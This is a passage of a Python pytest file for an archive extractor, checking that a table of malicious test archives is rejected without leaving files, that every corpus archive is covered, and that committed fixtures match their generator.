@pytest.mark.parametrize("name,exc,reason,limits", MALICIOUS, ids=[c[0] for c in MALICIOUS])
def test_malicious_archive_is_rejected_and_leaves_nothing(
    name: str, exc, reason: str, limits: ExtractLimits, tmp_path: Path
) -> None:
    assert_rejected(corpus(name), tmp_path, exc, reason, limits=limits)


def test_every_corpus_archive_is_covered() -> None:
    """A fixture nobody asserts on is a fixture that stops being true. The only
    archive allowed to sit outside the rejection table is the benign control."""
    covered = {row[0] for row in MALICIOUS} | {BUILDER.BENIGN}
    assert covered == set(BUILDER.CASES), covered ^ set(BUILDER.CASES)


def test_committed_corpus_matches_its_generator(tmp_path: Path) -> None:
    rebuilt = BUILDER.build_all(tmp_path / "rebuilt")
    for name, path in rebuilt.items():
        assert path.read_bytes() == corpus(name).read_bytes(), f"{name} drifted from its generator"


